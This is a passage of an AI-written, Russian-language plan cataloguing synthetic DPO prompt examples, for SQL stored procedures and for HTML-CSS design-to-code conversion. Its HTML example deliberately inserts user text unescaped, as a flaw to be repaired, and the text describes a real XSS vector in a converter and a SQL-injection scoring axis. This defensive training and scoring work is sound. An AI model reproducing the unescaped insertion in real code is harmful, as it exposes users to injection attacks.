   OWASP-ASVS (**CC-BY-SA-4.0 share-alike ЗАРАЖАЕТ производный датасет**; `RAG-07` :490) + CWE-TOP25
   (notice; :493) → при импорте держать отдельно/помечать; leakage — все 6 `ExcludedLeakageSignals`.
6. **Честность статуса (`catalog != capability`; SYNTHETIC_SEED помечен честно):** каталог = plan-content;
   учитель Qwen3.5-9B / Ollama НЕ вызывался; НИ ОДНА `GraphDpoPair` НЕ построена (0 пар); T-SQL-парсер/
   скорер/builder/обучаемый SQL-юнит канона в коде НЕ существуют — все capability-элементы **[условно от
   M1/M2]**; НИ ОДНА процедура НЕ исполнялась и НИ ОДНА БД НЕ открывалась ЭТИМ пассом (свип — только
   `git ls-files`/`grep`/`find`, read-only); `Y_best`/`Y_goal`/`N1`–`N5` — АВТОРСКИЕ композиции
   (`SYNTHETIC_SEED`) ПО ФОРМЕ живого синтетического SP-контракта генератора (:317–:319), НЕ реальные
   процедуры (реальных в 5 репо НЕТ — counted 0) и НЕ выходы реальных моделей; аудит-контракт «≤1 строки на
   (EntityId, сутки UTC)» — АВТОРСКАЯ конкретизация фразы живого seed «writes … Audit when audited» (:317)
   (нужна, чтобы ось идемпотентности была детерминированно проверяемой) — честно помечена authored-деталью;
   overlap-значения — целевые by construction, НЕ измеренный `overlap_ratio`; порог `0.75` SQL-гейта —
   концептуальный перенос PE-4.4, НЕ калиброванный; токен-оценки бюджета — аппроксимация; продуктовый код/
   тесты/git-write НЕ выполнялись. **SYNTHETIC_SEED-статус честен:** живого SP-корпуса НЕТ, способность
   генерировать/исполнять процедуры = записанный долг (§4 п.1); реальная поза платформы для БД-процедур —
   `ABSTAIN_NO_SOURCE` (:140).

#### PE-8.6 Блок 6 — ИСТОЧНИК РЕАЛИЗМА (read-only цитаты с путями; VERIFIED = живой spot-read ЭТИМ пассом)

| Что обосновано | Источник (file:line) | Статус проверки этим пассом |
|---|---|---|
| **Counted spot-scan РЕЗУЛЬТАТ (5 доступных репо): tracked `*.sql` = 0 везде; `CREATE PROC(EDURE)` определений в src = 0 везде; текстовые хиты — только абстенция (platform ×2) и синтетические тест-фикстуры (llm_mvp_core ×2); `find -iname *.sql` = 0 файлов; DbContext в flows = 0** | живой `git ls-files '*.sql'` + `grep -rniE "CREATE (OR ALTER )?PROC(EDURE)?"` + `find` по `xiigen-flows-dot-net-angular(-DpoImplementation)`, `xiigen-platform-dot-net-angular(-DpoImplementation)`, `llm_mvp_core` ЭТИМ пассом | VERIFIED (живой counted свип, все 5 репо) |
| ЖИВАЯ платформенная абстенция об отсутствии SP-источника: `SmartWikiAbstention("SQL stored procedures", "ABSTAIN_NO_SOURCE", "No CREATE PROCEDURE, CREATE PROC, stored procedure or DbContext source exists for FLOW-19.", "rg …")` | `C:/Projects/xiigen-platform-dot-net-angular/tests/Xiigen.Platform.Marketplace.Tests/SmartWikiServiceTests.cs:137–:141` | VERIFIED (живой read окна :125–:143 ЭТИМ пассом) |
| Синтетические тест-фикстуры `CREATE PROCEDURE [dbo].[GetOrderTotals]` (вход теста SP-doc таксономии — НЕ продуктовая процедура) | `C:/Projects/llm_mvp_core/Tests/ProjectWikiDomainTests.cs:2532, :2613` | VERIFIED (живой grep ЭТИМ пассом) |
| Живой SP-промпт с 5 counted must_include-осями (identity / sql_parameter_contract / sql_result_shape / sql_side_effects / dotnet_callers) — чеклист покрытия скорера | `C:/Projects/llm_mvp_core/42.ProjectWikiDomain/DocumentationGeneratorDpoGenerator.cs:66–:71` | VERIFIED (живой read ЭТИМ пассом) |
| Живая SQL-rejected таксономия — 5 counted классов FALSE-ABSENCE: `missing_sql_parameters` :85–:86 (зеркало N1), `missing_sql_result_shape` :87–:88, `missing_sql_side_effects` :89–:90 (переиспользован N2), `missing_dotnet_callers` :91–:92, `missing_stored_procedure_identity` :93–:94 | `.../42.ProjectWikiDomain/DocumentationGeneratorDpoGenerator.cs:85–:94` | VERIFIED (живой read ЭТИМ пассом) |
| Живая SP-маршрутизация батчей: `IsStoredProcedureBatch` («stored-procedure»/«sql» в batchId) :255–:257; 5-way `RejectedType` %5 :225–:232; 4 узких SP-batch-паттерна :198–:223 | `.../42.ProjectWikiDomain/DocumentationGeneratorDpoGenerator.cs:194–:257` | VERIFIED (живой read ЭТИМ пассом) |
| Живой синтетический SP-корпус (SEED-мост формы): `dbo.Get{Имя}{N}` :303; путь `Database/StoredProcedures/{procName}.sql` :311; meaning reads/writes/read-committed+audit :317; params `@EntityId/@IncludeInactive` :318; result set 5 колонок :319; 10 train + 10 heldOut дизъюнктных семей :296–:297; corpus-id/root :309–:310 | `.../42.ProjectWikiDomain/DocumentationGeneratorDpoGenerator.cs:293–:327` | VERIFIED (живой ПОЛНЫЙ read `BuildStoredProcedureUnits` ЭТИМ пассом) |
| Живое SP-ветвление doc-юнита: `IsStoredProcedureUnit` = SourcePath `.sql` ИЛИ `@`-параметр (маршрут `.ts`/`.cs` в generic-шаблон, `.sql`/@ в SP-шаблон) | `.../42.ProjectWikiDomain/DocumentationGeneratorUnit.cs:16–:18 (применение), :50–:52 (определение)` | CITED (VERIFIED в PE-6/PE-7 :2876–:2884; ЭТИМ пассом не перечитан) |
| `outbox.schema.sql` в репо `xiigen mvp` (1 tracked схема, 0 процедур) — из образца-Fable | `C:/Projects/xiigen mvp/server/src/fabrics/database/outbox/outbox.schema.sql` (репо на ЭТОЙ машине ОТСУТСТВУЕТ) | **CITED-not-verified** (репо не выкачан; `find` не нашёл файла; НЕ перепроверено — вывод «0 SP» усилен без него) |
| Контракт абстенции: «graph must not invent a stored procedure link»; абстенция = «a PASS for graph honesty» (родня N4 ORCH-02) | `C:/Projects/xiigen-platform-dot-net-angular/docs/plans/enterprise-adaptation/v3.3/LINKED-SYSTEM-GRAPH-CONTRACT.md:63–:74` | CITED (из образца-Fable; ЭТИМ пассом файл не перечитан — репо present) |
| 14 полей `GraphDpoPair` (канон пары, owner блок 07) | `active-codex-execution-plan-07-dpo-builder.md:246–:261` (через §1.4 каталога) | VERIFIED (владелец §1.4 читан ЭТИМ пассом) |
| Reward-scalarization: `reward(side)=Beta·(policyLogP−referenceLogP)` + `margin` + `LOW_CONTRAST` | `active-codex-execution-plan-07-dpo-builder.md:341–:360` | CITED (владелец §1.4; VERIFIED live в PE-6/PE-7) |
| Bounded teacher-call Шаг 3a + budget num_ctx≈8192 + acceptance-independence + `Y_best`-детерминизм | `active-codex-execution-plan-09-auto-dpo-loop.md` §Шаг 3a :492–:502, :504–:544 | CITED (владелец каталога §1.1; PE-3 VERIFIED live) |
| Профиль учителя `qwen35-local-v1` + `TeacherProvenance` 20 полей | `active-codex-execution-plan-08-legal-teacher-gate.md` §3.5.2 :779–:833, §3.1 :389–:409 | CITED (владелец каталога §1.1/§1.4) |
| `TP1_LOCAL` eval/quarantine до `G-DPO-FINAL` (`DpoTrainReady=false`, нет `TrainBatchAsync`) | `active-codex-execution-two-phase-local-remote-overlay.md:48–:53` | CITED (владелец каталога карта) |
| `sqlInjectionArbiter` рубрика = ОСЬ СКОРЕРА N3 (bound-параметры vs конкатенация/EXEC) + Tier-1 CWE-TOP25/OWASP-ASVS; share-alike CC-BY-SA-4.0 карантин | `RAG-07-external-sources.md` :449, :490, :493 | CITED (из образца-Fable; ЭТИМ пассом RAG-07 не перечитан) |
| Paid=SQL лицензионный сплит + SESSION-07 consent-gate/`Sql/`-архитектура REFERENCE + default static-`.sql`-parsing | `RAG-02-orchestrator-extension.md` :18, :858, :859, :955 | CITED (владелец карты §3; VERIFIED живым grep в PE-5/PE-7) |
| Адресация `stored-proc/<база>/<процедура>` + ось скорера строки 7 + честная нота (а) долга локации (закрыт ЭТИМ проходом) + §4 п.1 | этот план §3 строка 7 (:328), нота :331(а), §4 п.1 :348–:354 | VERIFIED (владелец в этом файле) |
| Право доменно-локальных кодов + запрет dual-canon (переиспользование `missing_sql_side_effects` без переименования) | этот план §2.3 :299–:314 | VERIFIED (в этом же файле) |
| Доменный code-overlap гейт с вычитанием рамки (переносимое правило PE-4.4 + односторонний порог 0.75) | этот план PE-4.4 (:635 семья) | VERIFIED (в этом же файле — переиспользование PE-4/PE-5/PE-6/PE-7) |
| Секция-источник переноса (перенос с переякориванием, `DpoTrainReady` flip true→false) | `PLAN-VS-VSCODE-CONTINUE-v1.md:5462–:5707` (проход PE-8 Fable) | VERIFIED (живой read ЭТИМ пассом) |
| Confidence-ловушка (`DocumentationGeneratorOutput.Confidence`=`flags.Count/flags.Length`) + carrier-контекст | этот каталог PE-6.5/PE-7.5 (:2919, :3335–:3342) + `ProjectWikiDomainModels.cs:1126`/`DocumentationGeneratorUnit.cs:43` | VERIFIED (в этом же файле; якоря :1126/:43 VERIFIED в PE-7) |

#### PE8-ЛОГ — Что добавлено + счётчики + честность

1. **Добавлено (append-only):** эта секция «Prompt-Examples проход PE-8/10 — Задача 7 — Хранимые
   процедуры (SQL)» (блоки 1–6); обновлена ОДНА строка статус-таблицы §5.2 (Хранимые процедуры → ЗАПОЛНЕНО
   PE-8, маркер `[FIX-PE-8]`) и front-matter `pass` + `pass_pe8_fill` (single-owner FC-44: заголовок и
   строка статуса свипнуты в ОДНОМ шаге, `stale-status-carrier` исключён); обновлён §4 п.1 (долг локации
   SQL) — записан СОБСТВЕННЫЙ counted spot-scan РЕЗУЛЬТАТ ЭТИМ пассом с честной пометкой отсутствия репо
   `xiigen mvp`. Прочий старый текст НЕ переписан.
2. **Счётчики — БЕЗ изменений:** WO 53 / решения 26 / ветки 55 / связи 21 / M5=46 (+ 188 non-spec .ts
   PE-5) — каталог = plan-content, не work-order; реального нового WO проход не создал (движение счётчика
   возможно только в PE-10). `readiness` плана (`PLAN_NOT_READY`) НЕ тронут; PLAN-ONLY.
3. **Пакет честности:** изменён ТОЛЬКО этот файл. Примеры — ПЛАНОВЫЕ ОБРАЗЦЫ: Ollama/учитель НЕ
   вызывался; НИ ОДНА `GraphDpoPair` НЕ построена (0 пар); T-SQL-парсер/скорер/builder/обучаемый SQL-юнит в
   коде НЕ существуют; НИ ОДНА процедура НЕ исполнялась, НИ ОДНА БД НЕ открывалась (свип — только
   `git ls-files`/`grep`/`find`); `Y_best`/`Y_goal`/`N1`–`N5` — АВТОРСКИЕ композиции (`SYNTHETIC_SEED`) ПО
   ФОРМЕ живого синтетического SP-контракта (:317–:319), НЕ реальные процедуры (counted 0) и НЕ verbatim-
   копии; аудит-dedup-контракт — authored-конкретизация seed-фразы «when audited» (помечена);
   overlap-значения — целевые by construction; порог `0.75` — концептуальный перенос PE-4.4, НЕ
   калиброванный; токен-оценки — аппроксимация. **Против образца-Fable этот проход СТРОЖЕ по канону и
   честнее по источнику:** (а) `DpoTrainReady` flip `true→false` (образец ставил `true` — у нас
   `dual-live-canon` статуса готовности, FC-44, + source-кавета); (б) СОБСТВЕННЫЙ counted spot-scan 5
   доступных репо ЭТИМ пассом (0 реальных SP), а не приём чужого свипа — образцовый `xiigen mvp`
   ОТСУТСТВУЕТ на машине, `outbox.schema.sql` записан CITED-not-verified, а не как перепроверенный факт;
   (в) все 6 `ExcludedLeakageSignals` канона (образец нёс 5 + 2 внеканонных на канон-строке — у нас
   `connection_string`/`database_server_name` = правило secretPresence-карантина, НЕ 7-й leakage-сигнал,
   15-е поле не добавляется); (г) пара негативов = явный КОНТРАСТ false-presence (`sql_hallucinated_parameter`,
   НОВЫЙ) ↔ false-absence (`missing_sql_side_effects`, ЖИВОЙ канон переиспользован), перенос инсайта
   PE-6/PE-7 на SQL (образец нёс `sql_declared_parameter_unused` — иная ось); (д) живой ПОЛНЫЙ re-read
   `BuildStoredProcedureUnits` :293–:327 + SP-промпт :66–:71 + SQL-таксономия :85–:94 + маршрутизация
   :194–:257 ЭТИМ пассом. Негативы покрывают 5 классов (2 доменно-локальных пара presence/absence + 1
   доменно-локальный security + 2 канонических); живые `missing_sql_result_shape`/`missing_dotnet_callers`
   инстанцированы НЕ отдельными N (result-shape ось живёт в scorer-чеке 4 и дефектах `Y_best`;
   dotnet_callers — док-ось PE-6-семьи, в код-задаче принадлежит wiki/doc-домену) — полный баланс классов =
   обязанность DPO-build. Spot-read ≠ полное чтение: генератор `DocumentationGeneratorDpoGenerator.cs`
   читан на окнах :60–:140 и :188–:328; `DocumentationGeneratorUnit`/`ProjectWikiDomainModels` — якоря
   CITED из PE-6/PE-7; RAG-07/RAG-02/plan-08/09/overlay — CITED через каталог. Валидация прохода = Opus 4.8
   (родитель) ДО старта PE-9 (HTML-CSS).

---
*Конец прохода PE-8/10. PE-9 (HTML-CSS) стартует после валидации Opus 4.8 этого прохода.
Канон-переключение PE-9 (нота для следующего прохода): домен = `44.DesignConversionDomain` (design→код:
html+css→server→trained model→visual QA→DPO) + `FigmaToCode` Element/Style IR (baseline); `Level=unit`/`node`,
`NodeOrEdgeId=design-conversion/<макет>/<фрагмент>`; ГЛАВНЫЙ ЧЕСТНЫЙ ДОЛГ (§4 п.3) — эхо-судья Phase-0:
критик приёмки = эхо-константа (`critic.Confidence == verdict.Score == const`), потолок качества занижен,
Route B пуст, 0/10 e2e → честный `DpoTrainReady=false` до Phase-0 замены эхо-судьи независимым доменным
скорером; XSS-негатив = teaching-negative под security-карантином (rejected-markup text-only, НЕ
исполняется); канонического XSS-арбитра в `RAG-07` НЕТ — PE-9 задаёт доменно-локальный
`dcm_xss_unsanitized_markup` (якорь — живой unescaped `containingString` FigmaToCode); reward-scalarization
ОБЯЗАТЕЛЬНА (html+css = не-скалярный многоэлементный выход) + markup-нормализация (whitespace/indent/
attribute-order) — прайм-вектор reward-hacking разметки.*

---

## Prompt-Examples проход PE-9/10 — Задача 8 — HTML-CSS (`44.DesignConversionDomain` / FigmaToCode design→код)

**[FIX-PE-9]** **Дата:** 2026-07-14. **Автор:** Opus 4.8 (Ultracode), одиночный bounded-агент прохода PE-9/10
(PLAN-ONLY, R2: ни продуктового кода, ни тестов, ни git-write; правился ТОЛЬКО этот файл; RAG/план/
`44.DesignConversionDomain`/FigmaToCode читались read-only; ни один рендер/браузер/учитель НЕ вызывался).
**Авторитет:** живая unquoted-директива Luba 2026-07-13 (каталог примеров промптов positive/negative под 8 задач,
«в соответствии с реализацией»; «не надо исполнять» сохраняется) + вердикт Opus 4.8 на PE-8 — VALID. Содержание =
заполненный шаблон §2.1 для задачи 8 «HTML-CSS (design→код)» (блоки 1–6). Это ПОСЛЕДНИЙ тип-задачи проход (8/8
типов заполнены); следующий PE-10 = консолидация. **Канон-переключение против PE-2..PE-8 (§2.3 + §4 п.3):** (а) тип
= КОД-задача (улучшить сгенерированный HTML+CSS фрагмента макета, как PE-4/PE-5/PE-8), домен реализации ЖИВОЙ и
самый богатый в каталоге — `44.DesignConversionDomain` (полная `ILearningMachine` + DPO + visual-QA + checkpoint),
плюс детерминированный front-конвертер переиспользуется из FigmaToCode (Element/Style IR); (б) таксономия негативов
= доменно-локальные `dcm_*`-коды (канонического RAG-07 XSS/HTML-injection арбитра НЕТ — честный результат оси
security) + канон `ORCH-02` на маршрутизации + `PromptError-11` — все с указанием родительской оси, no dual-canon;
(в) reward-scalarization ОБЯЗАТЕЛЬНА и распадается по-новому: html+css = НЕ-скалярный многоэлементный выход →
явное правило `reward(side)` + `Q_struct` (SI_GATE_3, CLAUDE.md «reward-scalarization rule for non-scalar
chosen/rejected»); (г) markup-нормализация ОБОСТРЕНА (whitespace/indent/attribute-order/CSS-property-order/
tag-синоним — прайм-вектор reward-hacking разметки); (д) **ЧЕСТНЫЙ разворот: это ЕДИНСТВЕННЫЙ код-домен каталога с
настоящим доменным Phase-0-блоком в АРБИТРЕ ПРИЁМКИ** — судья визуального качества = эхо-константа
(`critic.Confidence == verdict.Score`, VERIFIED spot-read этим пассом), поэтому `DpoTrainReady=false` держит §4 п.3
(эхо-судья), а не только G-DPO-FINAL.

### Задача 8 — HTML-CSS (`44.DesignConversionDomain` / FigmaToCode Element/Style IR)

#### PE-9.1 Блок 1 — ДОМЕН РЕАЛИЗАЦИИ + адресация пары + counted spot-read живых типов

По-человечески: задача 8 — пользователь расширения VS/VS Code даёт макет (Figma-экспорт/PNG) и просит «сделай
страницу по этому макету» или «улучши этот сгенерированный HTML+CSS»; конвейер маршрутизирует design-вход к живому
домену `44.DesignConversionDomain` (карта §3 строка 8), который обязан выдавать РАЗМЕТКУ В КОНТРАКТНОЙ РАМКЕ дизайна
(семантические теги, доступность, адаптивная раскладка из auto-layout, визуальная точность к макету, безопасное
экранирование), а не «просто рендерящийся HTML». Владелец-домен — `44.DesignConversionDomain`; детерминированный
front-конвертер (Figma→IR→HTML+CSS) переиспользуется из FigmaToCode (`Element`/`Style` IR + `element-code.ts`),
но внешние Claude/OpenAI-вызовы FigmaToCode ЗАМЕНЯЮТСЯ обучаемыми юнитами 44 (R7 external-tool-ban, R5 модель-в-репо).
Design→code = НАПРАВЛЕНИЕ #4 из четырёх (последний тип-задачи проход).

**Counted spot-read живых типов ЭТИМ пассом (read-only; git-grep/Read реального источника ДО утверждения seed-базиса):**

| Живой тип / факт | Источник (file:line) | Статус |
|---|---|---|
| `IDesignConversionImproverUnit : ILogicalUnit<DesignConversionImproverUnitInput, DesignConversionImproverUnitOutput>` — обучаемый design→code юнит | `44.DesignConversionDomain/DesignConversionUnitContracts.cs:41–:44` (вход :21–:26 `{Request, CriticVerdict(VisualVerdict), Candidate(Html/Css), QaEvidenceRefs}`, выход :28–:34 `{Candidate, Output, DeterministicLogicClaimedAsLearning}`) | VERIFIED (живой read) |
| `IDesignConversionCriticUnit : ILogicalUnit<CriticUnitInput, CriticUnitOutput>`; critic-выход = `VisualVerdict` | `DesignConversionUnitContracts.cs:7–:19,:36–:39` | VERIFIED |
| `VisualVerdict(VerdictId, Score, Defects[], EvidenceRefs[], Passed)`; `VisualDefect(DefectId, Category, Severity, Description, X, Y, W, H, EvidenceImageIds)`; `DesignConversionImprovementCandidate{Html, Css, ChangeReasons, ...}`; `DesignConversionImprovementOutput{Html, Css, Verdict, Accepted}` | `DesignConversionContracts.cs:106–:111,:95–:104,:122–:129,:131–:139` | VERIFIED |
| `DesignConversionDpoTrainingRecord{Chosen, Rejected, UsefulnessScore, NegativeReasonTaxonomy, License, Quarantine, Provenance}` (пара-носитель домена) | `DesignConversionContracts.cs:161–:175` | VERIFIED |
| DPO-margin домена = `Chosen.Verdict.Score − Rejected.Verdict.Score` (то есть `reward(side)` домена СЕЙЧАС = `side.Verdict.Score`) | `DesignConversionDpoGenerator.cs:273`; `CriticUnit` const :12 | VERIFIED |
| FigmaToCode IR `Element` (18 полей: `containingString`, `style(Style)`, `subElements[]`, `openTag`/`closeTag`, `code`, `classNames[]`, `codeCss`, ...) | `C:/Projects/FigmaToCode-design-gen/src/plugin/models/Element.ts:4–:23` | VERIFIED (живой read) |
| FigmaToCode IR `Style` (`name`, `settings(Setting[])`, `sceneSettings`, `image`, `debugHistory`) | `.../models/Style.ts:3–:10` | VERIFIED |
| FigmaToCode лицензия ISC (пермиссивная, класс MIT → training-ok) | `.../package.json:2–:5` (`figma-to-code` v2.0.0, `"license":"ISC"`) | VERIFIED |
| ЖИВОЙ XSS-вектор переиспользуемого конвертера: user-text узла (`containingString`) течёт в HTML/CSS СЫРЫМ (raw CSS-конкатенация `property.name+':'+property.value+';'` :131; `lookForPlaceholder` возвращает `containingString` без escape :150) | `.../src/plugin/utils/element-code.ts:130–:151` | VERIFIED |

**Вердикт локации (честный):** реальная HTML-CSS/design-conversion инфраструктура ЕСТЬ и она — САМАЯ БОГАТАЯ из
код-доменов каталога (полная `ILearningMachine<DesignConversionDomain>` + DPO-контур + visual-QA + checkpoint/
manifest/promotion; 40+ файлов домена). НО домен — `PASS_AS_HONEST_UNTRAINED_SCAFFOLD`, **0/10 e2e**: судья приёмки
= ЭХО-КОНСТАНТА (см. PE-9.5 п.2 + §4 п.3), `EvaluateAsync`/gate `PassesGate:false` (`DesignConversionMachine.cs:125`),
внешний visual-judge НЕ сконфигурирован по умолчанию (`NoConfiguredVisualJudge` → Score 0.0 blocked,
`DesignConversionVisualJudge.cs:376+`; локальный `DefaultLocalDesignConversionVisualJudge` :78–:189 = детерминированный
metadata-скорер, `external_ai_visual_judge_executed:false`), синтетический DPO-baseline
(`chosenScore=Max(0.01, ...Verdict.Score)`, `DesignConversionDpoGenerator.cs:1115`). Поэтому примеры прохода —
**SYNTHETIC_SEED-forward** (как API-wiring PE-5 и SQL PE-8): авторская композиция ПО ФОРМЕ живого IR-контракта
FigmaToCode `Element/Style` + живых доменных контрактов 44, поведение не выдумывается сверх контракта; честная
пометка — PE-9.5 п.6.

Адресация пар (канон блока 07 — `GraphDpoPair.Level` / `NodeOrEdgeId`, §1.4): `Level="unit"` (либо `node` при
графовой адресации design-узла — карта §3 строка 8), `NodeOrEdgeId="design-conversion/profile-card/avatar-header-block"`
(паттерн `design-conversion/<макет>/<фрагмент>`; `<макет>` = синтетический seed-id `profile-card`; после реальных
пользовательских загрузок `<макет>` = реальный design-ref — PersonalAdaptive-нога). **LegScope = common-кандидат** по
ДВУМ основаниям: (а) базовый HTML+CSS НЕ в платном списке `RAG-02` (Paid = Angular/AngularJS/Java/SQL) — свободный
tier, доменный дом common-модели (framework-таргеты типа Angular остаются платными — зона PE-5); (б) источник =
первопартийный: FigmaToCode = **ISC** (VERIFIED `package.json:5`, класс MIT — training-safe как форк Luba) + сам
44-домен = код Luba. НО: реальные пользовательские МАКЕТЫ (Figma-файлы, скриншоты, приватный UI) →
`PersonalAdaptive`/`.xiigen` до redaction+approval by construction (`BLOCK_FOR_COMMON`).

#### PE-9.2 Блок 2 — POSITIVE (chosen) пример промпта

Сценарий (якорь — живой IR-контракт FigmaToCode `Element/Style`): улучшить черновой HTML+CSS для шапки карточки
профиля — FRAME с auto-layout, детьми {аватар-img, имя-text, статус-text}. Y_best — правдоподобный «работающий» выход
СЫРОГО front-конвертера ДО семантического/flex/escape-ремонта (рендерится, но нарушает пол-рубрики); Y_goal — разметка
в полной контрактной рамке дизайна (семантика, доступность, адаптив, экранирование, визуальная точность).

**(а) Bounded teacher-call (plan-09 §Шаг 3a; профиль учителя `qwen35-local-v1` plan-08 §3.5.2) — заполненный request
JSON (учитель видит ТОЛЬКО эти поля, НЕ репозиторий, НЕ реальный макет пользователя):**

```json
{
  "task": "Улучшить сгенерированный HTML+CSS для этого элемента макета (шапка карточки профиля: аватар + имя + статус). Улучшай РАЗМЕТКУ в контрактной рамке дизайна (семантические теги, доступность, адаптивная раскладка из auto-layout, визуальное соответствие макету, безопасное экранирование текста узлов) — не меняй набор видимых элементов дизайна и не решай задач за пределами этого фрагмента.",
  "target_unit": "design-conversion/profile-card/avatar-header-block",
  "input_context": "IR (Element/Style, форма FigmaToCode): FRAME 'profileHeader' {layoutMode:HORIZONTAL(auto-layout), itemSpacing:16, padding:16, w:320,h:96} с детьми: [IMAGE 'avatar' {w:64,h:64, fill:image(avatar.png)}, TEXT 'name' {characters:userName, weight:600, color:#1a1a1a}, TEXT 'status' {characters:statusText, color:#9a9a9a}]; объявленные видимые элементы дизайна (узлы IR): {avatar-image, name-text, status-text}; целевая раскладка: flex-row по центру (Figma auto-layout -> CSS flexbox); текст узлов приходит из Figma characters (пользовательские данные).",
  "current_best_output": "<Y_best HTML+CSS — сырой выход front-конвертера, развёрнут в блоке ниже; в транспорте JSON-escaped>",
  "requirements": [
    "parse-shape: валидный HTML-фрагмент + связный CSS; РОВНО набор объявленных узлов IR (не добавлять/не терять элементы дизайна)",
    "семантика: контейнер/элементы получают семантические теги по роли (article/header/img/nav/button), не сплошные div",
    "доступность: каждый <img> несёт непустой alt; статус/интерактив — доступное имя/ARIA; контраст >= 4.5:1",
    "адаптивность: auto-layout -> CSS flexbox/grid (display:flex + direction + gap), НЕ hardcoded position:absolute с фикс-px",
    "визуальная точность / полнота: раскладка/порядок/размеры соответствуют макету; ни один объявленный узел IR не пропущен",
    "безопасность: текст узлов (Figma characters = пользовательские данные) ЭКРАНИРУЕТСЯ при вставке в HTML; никакой конкатенации user-text в innerHTML/шаблон без escape"
  ],
  "wrong_markers": [
    "dcm_xss_unsanitized_markup", "dcm_uncovered_ir_node", "dcm_hallucinated_element", "ORCH-02", "PromptError-11"
  ],
  "output_schema": {
    "goal_text": "string — улучшенный HTML+CSS (Y_goal); ОДИН фрагмент разметки + его CSS, не целая страница и не проект",
    "improvements": "string[] — существенные улучшения относительно current_best_output",
    "current_output_is_already_optimal": "bool — self-report учителя (диагностика, НЕ приёмка)"
  }
}
```

**Y_best (current_best_output, развёрнуто; правдоподобный сырой выход front-конвертера — как Y_best PE-4/PE-8):**

```html
<div id="profileHeader" class="dcm-frame" style="position:absolute; left:0; top:0; width:320px; height:96px;">
  <div id="avatar" class="dcm-img" style="position:absolute; left:16px; top:16px; width:64px; height:64px; background:url(avatar.png);"></div>
  <div id="name" class="dcm-text" style="position:absolute; left:96px; top:20px; font-weight:600; color:#1a1a1a;">{{userName}}</div>
  <div id="status" class="dcm-text" style="position:absolute; left:96px; top:52px; color:#9a9a9a;">{{statusText}}</div>
</div>
```

Дефекты Y_best (то, что учитель должен улучшить; это НЕ инъекции негативов — сырой выход с несколькими слабостями, как
Y_best PE-4/PE-8): всё на `position:absolute` с фикс-px (Figma auto-layout ПОТЕРЯН → не адаптивно); аватар =
`background:url()` на `<div>` (нет реального `<img>`, нет `alt`); сплошные `<div>` (нет семантики); `{{userName}}`/
`{{statusText}}` подставляются в разметку как есть (латентный XSS, если рендер = строковая конкатенация как во
front-конвертере FigmaToCode `element-code.ts:150`); контраст статуса `#9a9a9a` на белом < 4.5:1; ни `role`/`aria`, ни
порядка чтения. Бюджет `num_ctx≈8192`: task+criteria ≈ 900 ток.; input_context ≈ 550; current_best_output ≈ 300;
schema ≈ 350; резерв ответа 1024 — итого ≈ 3100 ≪ 8192 (unit-level, ОДИН фрагмент; `trimmed=false`).

**(б) Ожидаемая форма ХОРОШЕГО выхода (`goal_text` = Y_goal; ОДИН фрагмент в полной контрактной рамке дизайна; структура,
не эссе; достижимо студентом ≤3–4B — конечный словарь паттернов: семантические теги, alt/ARIA, flex-скелет, escape-обёртка):**

```html
<article id="profileHeader" class="dcm-frame">
  <img class="dcm-avatar" src="avatar.png" alt="{{userName|escaped}} — фото профиля" width="64" height="64">
  <header class="dcm-id">
    <span class="dcm-name">{{userName|escaped}}</span>
    <span class="dcm-status" role="status">{{statusText|escaped}}</span>
  </header>
</article>
```

```css
.dcm-frame { display:flex; flex-direction:row; align-items:center; gap:16px; padding:16px; }
.dcm-avatar { width:64px; height:64px; border-radius:50%; flex:0 0 auto; }
.dcm-id { display:flex; flex-direction:column; gap:4px; }
.dcm-name { font-weight:600; color:#1a1a1a; }
.dcm-status { color:#595959; } /* контраст >= 4.5:1 на белом */
```

```json
{
  "improvements": [
    "семантика: сплошные div заменены на article/header/img+span; аватар — реальный <img>, а не background-div",
    "адаптивность: position:absolute + фикс-px заменены flexbox из auto-layout (display:flex + direction + align-items + gap)",
    "доступность: <img> получил непустой alt; статус помечен role=status; контраст статуса поднят #9a9a9a -> #595959 (>=4.5:1)",
    "безопасность: пользовательский текст узлов экранируется при вставке ({{userName|escaped}}/{{statusText|escaped}})",
    "полнота: все объявленные узлы IR (avatar/name/status) сохранены и в исходном порядке — ни один не пропущен и ни один лишний не добавлен"
  ],
  "current_output_is_already_optimal": false
}
```

**(в) Пер-доменные проверки `IndependentDomainScorer` (design→code ось — карта §3 строка 8: «visual QA ось `RAG-04` +
Element/Style IR-валидность»; веса/пороги — per-WO деталь, WO может только УЖЕСТОЧИТЬ):**
1. structured-JSON валидность ответа учителя (невалидный кандидат — вне argmax);
2. **parse-shape:** `goal_text` парсится как валидный HTML-фрагмент + связный CSS; множество видимых элементов ==
   множеству объявленных узлов IR (I/O-инвариант; пропуск узла = `dcm_uncovered_ir_node`, лишний = `dcm_hallucinated_element`);
3. **семантика:** контейнер/элементы несут семантические теги по роли (детектор «сплошные div вместо article/header/img/nav/button»);
4. **доступность:** каждый `<img>` имеет непустой `alt`; статус/интерактив — доступное имя (`role`/`aria-label`/`<label>`);
   контраст >= 4.5:1;
5. **адаптивность:** для auto-layout FRAME присутствует flex/grid, НЕТ hardcoded `position:absolute`+фикс-px как основы раскладки;
6. **безопасность разметки:** нет вставки неэкранированного user-text (`containingString`) в разметку, нет `innerHTML`-конкатенации
   входа (провал = доменно-локальный `dcm_xss_unsanitized_markup`);
7. **ВИЗУАЛЬНЫЙ судья — ЭХО-КАВЕТА (КРИТИЧНО, §4 п.3):** ось visual-fidelity `VisualVerdict.Score` СЕЙЧАС — эхо-константа
   (`critic.Confidence == verdict.Score`, VERIFIED `DesignConversionTrainedUnits.cs:47`; потолок занижен; Route B пуст) —
   судья ЭХО-ит, а не судит; поэтому пункты 2–6 (структурные, детерминированно проверяемые парсером) — надёжная ось приёмки
   уже сейчас, а реальный визуальный скор — **[условно от M1]** и есть НАСТОЯЩАЯ цель ремонта (замена эхо-судьи).
   Судья Y_best-selection = детерминированный eval-only; решение гейта: `chosen = Y_goal ⇔ Q_struct(Y_goal) > Q_struct(Y_best)`,
   ничья → Y_best (Y_best-determinism classification, overlay).

**(г) STUDENT-проекция (unit I/O обучаемой стороны — ЖИВОЙ контракт 44):** design→code юнит =
`IDesignConversionImproverUnit : ILogicalUnit<DesignConversionImproverUnitInput, DesignConversionImproverUnitOutput>`
(`DesignConversionUnitContracts.cs:41–:44`): вход `{Request, CriticVerdict(VisualVerdict), Candidate(Html/Css),
QaEvidenceRefs}` → выход `{Candidate(улучшенный Html/Css), Output, DeterministicLogicClaimedAsLearning}`. В паре:
`InputContext` = IR-контекст (Element/Style) + критик-вердикт дефектов + Y_best-кандидат (БЕЗ сырого промпта пользователя —
